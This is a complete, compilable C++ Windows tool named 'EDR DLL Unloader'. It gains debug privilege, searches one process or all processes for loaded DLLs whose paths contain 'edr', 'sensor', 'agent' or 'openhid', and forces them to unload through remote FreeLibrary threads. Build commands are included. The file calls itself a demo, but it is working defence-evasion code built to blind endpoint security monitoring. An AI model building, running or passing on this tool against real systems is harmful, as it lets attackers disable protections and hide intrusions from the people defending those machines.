// EDR DLL Unloader - Safely attempt to unload injected, file-backed DLLs from target processes
// DISCLAIMER: FreeLibrary in a remote process ONLY works for legitimately loaded, file-backed modules.
// It will NOT remove manual-mapped (memory-only) payloads. Use with caution in demos.
//
// Features:
//  - Enables SeDebugPrivilege
//  - Target a single PID (--pid N) or all processes (--all)
//  - Filter by substring (--module substring), defaults to suspicious keywords (openhid, edr, sensor, agent)
//  - Dry run (--dry-run): report what would be unloaded without changing anything
//  - Verifies module is file-backed before attempting unload
//  - Finds the remote address of FreeLibrary via kernel32 base + RVA from local process
//
// Build (MSVC): cl /EHsc /O2 edr_unloader.cpp /link psapi.lib advapi32.lib
// Build (MinGW-w64): x86_64-w64-mingw32-g++ -O2 edr_unloader.cpp -lpsapi -ladvapi32 -o edr_unloader.exe

#define UNICODE
#define _UNICODE
#include <windows.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>
#include <string>
#include <algorithm>
#include <cstdint>
#include <cstring>

#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "advapi32.lib")

static const char* kDefaultKeywords[] = {"openhid", "edr", "sensor", "agent"};

static bool iequals_ascii(const std::string& a, const std::string& b) {
    if (a.size() != b.size()) return false;
    for (size_t i = 0; i < a.size(); ++i) {
        char ca = (char)tolower((unsigned char)a[i]);
        char cb = (char)tolower((unsigned char)b[i]);
        if (ca != cb) return false;
    }
    return true;
}

static std::string tolower_ascii(std::string s) {
    for (auto& c : s) c = (char)tolower((unsigned char)c);
    return s;
}

static bool EnablePrivilege(LPCWSTR name) {
    HANDLE hToken{};
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return false;
    LUID luid{};
    if (!LookupPrivilegeValueW(nullptr, name, &luid)) { CloseHandle(hToken); return false; }
    TOKEN_PRIVILEGES tp{}; tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr);
    bool ok = (GetLastError() == ERROR_SUCCESS);
    CloseHandle(hToken);
    return ok;
}

static bool IsFileBackedModule(HANDLE hProc, HMODULE mod) {
    MEMORY_BASIC_INFORMATION mbi{};
    if (!VirtualQueryEx(hProc, mod, &mbi, sizeof(mbi))) return false;
    if (mbi.Type != MEM_IMAGE) return false;
    char path[MAX_PATH]{};
    if (GetMappedFileNameA(hProc, mod, path, MAX_PATH) == 0) return false;
    return true;
}

static HMODULE FindRemoteKernel32(HANDLE hProc) {
    HMODULE mods[1024]; DWORD cbNeeded=0;
    if (!EnumProcessModulesEx(hProc, mods, sizeof(mods), &cbNeeded, LIST_MODULES_ALL)) return nullptr;
    size_t count = cbNeeded / sizeof(HMODULE);
    for (size_t i=0;i<count;++i) {
        char name[MAX_PATH]{};
        if (GetModuleFileNameExA(hProc, mods[i], name, MAX_PATH)) {
            std::string s = tolower_ascii(name);
            if (s.size() >= 12 && s.rfind("\\kernel32.dll") == s.size()-12) {
                return mods[i];
            }
        }
    }
    return nullptr;
}

static LPTHREAD_START_ROUTINE ResolveRemoteFreeLibrary(HANDLE hProc) {
    // local addresses
    HMODULE k32Local = GetModuleHandleW(L"kernel32.dll");
    if (!k32Local) return nullptr;
    FARPROC freeLocal = GetProcAddress(k32Local, "FreeLibrary");
    if (!freeLocal) return nullptr;

    // remote base
    HMODULE k32Remote = FindRemoteKernel32(hProc);
    if (!k32Remote) return nullptr;

    // compute RVA in local, add to remote base
    auto rva = (uintptr_t)freeLocal - (uintptr_t)k32Local;
    auto remote = (LPTHREAD_START_ROUTINE)((uintptr_t)k32Remote + rva);
    return remote;
}

static bool ShouldTargetModule(const std::string& pathLower, const std::string& filterLower) {
    if (!filterLower.empty()) {
        return pathLower.find(filterLower) != std::string::npos;
    }
    for (auto kw : kDefaultKeywords) {
        if (pathLower.find(kw) != std::string::npos) return true;
    }
    return false;
}

static void UnloadMatchesInProcess(DWORD pid, const std::string& filterLower, bool dryRun) {
    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION, FALSE, pid);
    if (!hProc) return;

    HMODULE mods[1024]; DWORD cbNeeded=0;
    if (!EnumProcessModulesEx(hProc, mods, sizeof(mods), &cbNeeded, LIST_MODULES_ALL)) { CloseHandle(hProc); return; }

    LPTHREAD_START_ROUTINE pRemoteFree = ResolveRemoteFreeLibrary(hProc);
    if (!pRemoteFree && !dryRun) {
        std::cout << "[-] PID " << pid << ": cannot resolve remote FreeLibrary (bitness/version mismatch?)\n";
        CloseHandle(hProc); return;
    }

    size_t count = cbNeeded / sizeof(HMODULE);
    for (size_t i=0;i<count;++i) {
        char path[MAX_PATH]{};
        if (!GetModuleFileNameExA(hProc, mods[i], path, MAX_PATH)) continue;
        std::string lower = tolower_ascii(path);

        if (!IsFileBackedModule(hProc, mods[i])) continue; // skip manual-mapped
        if (!ShouldTargetModule(lower, filterLower)) continue;

        std::cout << "[>] PID " << pid << ": target " << path << (dryRun? " (dry-run)" : "") << "\n";

        if (dryRun) continue;

        HANDLE hThread = CreateRemoteThread(hProc, nullptr, 0, pRemoteFree, mods[i], 0, nullptr);
        if (!hThread) {
            std::cout << "    [-] CreateRemoteThread failed: " << GetLastError() << "\n";
            continue;
        }
        WaitForSingleObject(hThread, 5000);
        DWORD code = 0; GetExitCodeThread(hThread, &code);
        std::cout << "    [+] FreeLibrary returned: " << code << "\n";
        CloseHandle(hThread);
    }

    CloseHandle(hProc);
}

static void Usage() {
    std::cout << "\nEDR DLL Unloader\n"
                 "  --pid <N>         Unload matching modules in PID N\n"
                 "  --all             Unload matching modules in all processes\n"
                 "  --module <substr> Match only modules whose path contains <substr> (case-insensitive)\n"
                 "  --dry-run         Do not unload; just print intended actions\n";
}

int wmain(int argc, wchar_t* argv[]) {
    EnablePrivilege(SE_DEBUG_NAME);

    bool all = false; DWORD pid = 0; bool dryRun = false; std::string filterLower;

    for (int i=1;i<argc;++i) {
        std::wstring arg = argv[i];
        if (arg == L"--all") { all = true; continue; }
        if (arg == L"--pid" && i+1 < argc) {
            pid = (DWORD)_wtoi(argv[++i]);
            continue;
        }
        if (arg == L"--module" && i+1 < argc) {
            std::wstring w = argv[++i];
            std::string s(w.begin(), w.end());
            filterLower = tolower_ascii(s);
            continue;
        }
        if (arg == L"--dry-run") { dryRun = true; continue; }
        if (arg == L"--help" || arg == L"-h") { Usage(); return 0; }
    }

    if (!all && pid == 0) { Usage(); return 0; }

    if (all) {
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap == INVALID_HANDLE_VALUE) { std::cout << "[-] snapshot failed\n"; return 1; }
#ifdef UNICODE
        PROCESSENTRY32W pe{}; pe.dwSize = sizeof(pe);
        if (Process32FirstW(snap, &pe)) {
            do { UnloadMatchesInProcess(pe.th32ProcessID, filterLower, dryRun); } while (Process32NextW(snap, &pe));
        }
#else
        PROCESSENTRY32 pe{}; pe.dwSize = sizeof(pe);
        if (Process32First(snap, &pe)) {
            do { UnloadMatchesInProcess(pe.th32ProcessID, filterLower, dryRun); } while (Process32Next(snap, &pe));
        }
#endif
        CloseHandle(snap);
    } else {
        UnloadMatchesInProcess(pid, filterLower, dryRun);
    }

    return 0;
}
